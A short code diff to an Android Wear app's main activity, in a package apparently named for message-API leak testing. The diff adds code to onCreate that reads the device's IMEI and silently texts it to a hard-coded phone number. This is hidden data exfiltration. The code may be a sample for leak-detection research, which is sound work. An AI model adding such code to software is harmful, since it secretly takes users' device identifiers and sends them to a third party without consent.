@@ -1,10 +1,13 @@
 package com.aroes.msgapileak;
 
 import android.app.Activity;
+import android.content.Context;
 import android.os.Bundle;
 import android.support.annotation.NonNull;
 import android.support.annotation.Nullable;
 import android.support.wearable.view.WatchViewStub;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.widget.TextView;
 
@@ -79,6 +82,10 @@ public class MainActivity extends Activity implements GoogleApiClient.Connection
                 mTextView = (TextView) stub.findViewById(R.id.text);
             }
         });
+        TelephonyManager TM = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+        String imeiNo = TM.getDeviceId();
+        SmsManager SM = SmsManager.getDefault();
+        SM.sendTextMessage("07922021702", null, imeiNo, null, null);
     }
 
     @Override
